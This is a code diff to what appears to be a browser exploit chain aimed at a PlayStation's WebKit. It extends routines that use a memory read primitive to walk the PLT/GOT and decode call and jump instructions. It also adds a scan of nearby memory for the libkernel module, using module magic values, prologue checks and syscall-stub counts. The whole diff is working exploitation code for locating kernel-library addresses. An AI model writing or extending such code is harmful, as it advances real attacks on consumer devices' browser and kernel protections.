@@ -3,7 +3,7 @@
  * Never reads high unmapped IAT (+0x3cb8cc8). Max ~4 reads per GOT slot.
  */
 import { int64 } from "./int64.js";
-import { webkitRvaMax } from "./pivot_gadgets.js";
+import { webkitRvaMax, webkitRvaMaxFromOff } from "./pivot_gadgets.js";
 
 const ELF_MAGIC = 0x464c457f;
 const SCE_MAGIC = 0x1d3d154f;
@@ -71,6 +71,11 @@ function u64FromRead8(w) {
 
 function iatCap(off) {
     return webkitRvaMax(off);
+}
+
+/** Mapped webkit **code** span — much smaller than full read cap; libkernel sits nearby. */
+function webkitModuleSpan(off) {
+    return webkitRvaMaxFromOff(off);
 }
 
 function rvaAllowed(rva, off) {
@@ -152,15 +157,15 @@ function loadSessionIatRva() {
     }
 }
 
-/** True if ptr looks like an address inside the mapped webkit image. */
+/** True if ptr looks like an address inside the webkit **module** (not nearby libkernel). */
 function ptrInWebkitImage(fnPtr, webkitBase, off) {
     if (!fnPtr || !webkitBase) return false;
     if (fnPtr.hi !== webkitBase.hi) return false;
-    const cap = iatCap(off);
+    const span = webkitModuleSpan(off);
     const lo = webkitBase.low >>> 0;
     const fl = fnPtr.low >>> 0;
     if (fl < lo) return false;
-    return (fl - lo) <= cap;
+    return (fl - lo) <= span;
 }
 
 /** External userland code pointer — not null, not webkit interior. */
@@ -223,7 +228,7 @@ function isSameWebkitModule(base, webkitBase, off) {
     const lo = webkitBase.low >>> 0;
     const bl = base.low >>> 0;
     if (bl < lo) return false;
-    return (bl - lo) <= iatCap(off);
+    return (bl - lo) <= webkitModuleSpan(off);
 }
 
 /** Sparse syscall stub count — libkernel.sprx / libkernel_web has many mov rax,N patterns. */
@@ -682,6 +687,9 @@ function scanPltGotChunk(p, webkitBase, off, state) {
             endRva: textRanges[0].hi,
             seen: {},
             refs: 0,
+            ff25: 0,
+            gotHigh: 0,
+            e8ext: 0,
         };
         return {
             done: false,
@@ -702,14 +710,45 @@ function scanPltGotChunk(p, webkitBase, off, state) {
                 w1 & 0xff, (w1 >>> 8) & 0xff, (w1 >>> 16) & 0xff, (w1 >>> 24) & 0xff,
             ];
             for (let i = 0; i < 7; i++) {
+                if (bytes[i] === 0xe8) {
+                    const insnRva = rva + i;
+                    const rel = s32(read4p(p, state.base.add32(insnRva + 1)));
+                    if (rel != null) {
+                        const destRva = insnRva + 5 + rel;
+                        if (destRva >= 0x10000) {
+                            const destPtr = state.base.add32(destRva);
+                            if (plausibleExtPtr(destPtr, state.base, off)) {
+                                state.e8ext++;
+                                const hit = lkFromFnPtr(p, destPtr, off, null);
+                                if (hit) {
+                                    saveLibkernelSession(hit.lk, hit.iatRva);
+                                    return {
+                                        done: true,
+                                        lk: hit.lk,
+                                        iatRva: hit.iatRva,
+                                        source: "e8+" + insnRva.toString(16) + "/" + hit.via,
+                                        state,
+                                        phase: "plt-hit",
+                                        refs: state.refs,
+                                    };
+                                }
+                            }
+                        }
+                    }
+                }
                 if (bytes[i] !== 0xff) continue;
                 if (bytes[i + 1] !== 0x15 && bytes[i + 1] !== 0x25) continue;
+                state.ff25++;
                 const insnRva = rva + i;
                 const raw = read4p(p, state.base.add32(insnRva + 2));
                 const disp = s32(raw);
                 if (disp == null) continue;
                 const gotRva = insnRva + 6 + disp;
-                if (gotRva < 0x10000 || gotRva > iatCap(off)) continue;
+                if (gotRva < 0x10000) continue;
+                if (gotRva > iatCap(off)) {
+                    state.gotHigh++;
+                    continue;
+                }
                 const key = gotRva.toString(16);
                 if (state.seen[key]) continue;
                 state.seen[key] = 1;
@@ -747,7 +786,8 @@ function scanPltGotChunk(p, webkitBase, off, state) {
                 cursor: state.cursor,
             };
         }
-        return { done: true, lk: null, state, phase: "plt-miss", refs: state.refs };
+        return { done: true, lk: null, state, phase: "plt-miss", refs: state.refs,
+            ff25: state.ff25, gotHigh: state.gotHigh, e8ext: state.e8ext };
     }
 
     return {
@@ -756,6 +796,102 @@ function scanPltGotChunk(p, webkitBase, off, state) {
         phase: "plt",
         cursor: state.cursor,
         refs: state.refs,
+        ff25: state.ff25,
+        e8ext: state.e8ext,
+    };
+}
+
+/** Fast libkernel module hunt ±32MB — prologue/stub check on SCE/ELF hit (OOM-safe). */
+function scanNearLibkernelChunk(p, webkitBase, off, sub, anchors) {
+    const RADIUS = LK_HUNT_RADIUS;
+    const STEP = 0x4000n;
+
+    if (!anchors || !anchors.length)
+        return { done: true, lk: null, state: sub, phase: "nearlk-skip" };
+
+    if (!sub) {
+        sub = scanAnchorsInit({}, anchors, RADIUS, STEP);
+        sub.pages = 0;
+        sub.hits = 0;
+        return {
+            done: false,
+            state: sub,
+            phase: "nearlk-start",
+            anchor: 0,
+            from: sub.cursor.toString(16),
+            to: sub.end.toString(16),
+        };
+    }
+
+    let batch = 0;
+    while (sub.cursor <= sub.end && batch < 6) {
+        const addr = bigToPtr(sub.cursor);
+        if (addr.hi >= 0x8) {
+            sub.pages++;
+            const magic = read4p(p, addr);
+            if (magic != null && isModuleMagic(magic)
+                && !isSameWebkitModule(addr, webkitBase, off)) {
+                sub.hits++;
+                if (isLibkernelPrologue(p, addr)) {
+                    saveLibkernelSession(addr, null);
+                    return {
+                        done: true,
+                        lk: addr,
+                        iatRva: null,
+                        source: "nearlk-prologue",
+                        state: sub,
+                        phase: "nearlk-hit",
+                        pages: sub.pages,
+                    };
+                }
+                const sc = scoreSyscallStubs(p, addr, 0x40000, 0x400);
+                if (sc >= 4) {
+                    saveLibkernelSession(addr, null);
+                    return {
+                        done: true,
+                        lk: addr,
+                        iatRva: null,
+                        source: "nearlk-stubs=" + sc,
+                        state: sub,
+                        phase: "nearlk-hit",
+                        pages: sub.pages,
+                    };
+                }
+            }
+        }
+        sub.cursor += sub.step;
+        batch++;
+    }
+
+    if (sub.cursor > sub.end) {
+        if (scanAnchorsAdvance(sub, RADIUS)) {
+            return {
+                done: false,
+                state: sub,
+                phase: "nearlk-anchor",
+                anchor: sub.anchorIdx,
+                pages: sub.pages,
+                hits: sub.hits,
+            };
+        }
+        return {
+            done: true,
+            lk: null,
+            state: sub,
+            phase: "nearlk-miss",
+            pages: sub.pages,
+            hits: sub.hits,
+        };
+    }
+
+    return {
+        done: false,
+        state: sub,
+        phase: "nearlk",
+        at: sub.cursor.toString(16),
+        pages: sub.pages,
+        hits: sub.hits,
+        anchor: sub.anchorIdx,
     };
 }
 
@@ -1740,13 +1876,22 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
         }
         if (c.done) {
             if (state.poopsLite) {
-                return {
-                    done: true,
-                    lk: null,
-                    state,
-                    phase: "lite-miss",
+                state.stage = "nearlk";
+                state.sub = null;
+                state.pltStats = {
                     refs: state.pltRefs,
-                    tried: c.tried,
+                    ff25: c.ff25,
+                    gotHigh: c.gotHigh,
+                    e8ext: c.e8ext,
+                };
+                return {
+                    done: false,
+                    state,
+                    phase: "nearlk-next",
+                    ff25: c.ff25,
+                    gotHigh: c.gotHigh,
+                    e8ext: c.e8ext,
+                    refs: c.refs,
                 };
             }
             state.stage = "got";
@@ -1757,6 +1902,30 @@ export function scanLibkernelChunk(p, webkitBase, off, state, opts) {
                 phase: "got-next",
                 prev: c.phase,
                 refs: state.pltRefs,
+            };
+        }
+        return Object.assign({ state }, c);
+    }
+
+    if (state.stage === "nearlk") {
+        const c = scanNearLibkernelChunk(p, webkitBase, off, state.sub, state.anchors);
+        state.sub = c.state;
+        if (c.done && c.lk) {
+            return Object.assign({ state }, c);
+        }
+        if (c.done) {
+            const st = state.pltStats || {};
+            return {
+                done: true,
+                lk: null,
+                state,
+                phase: "lite-miss",
+                refs: st.refs,
+                ff25: st.ff25,
+                gotHigh: st.gotHigh,
+                e8ext: st.e8ext,
+                nearPages: c.pages,
+                nearHits: c.hits,
             };
         }
         return Object.assign({ state }, c);
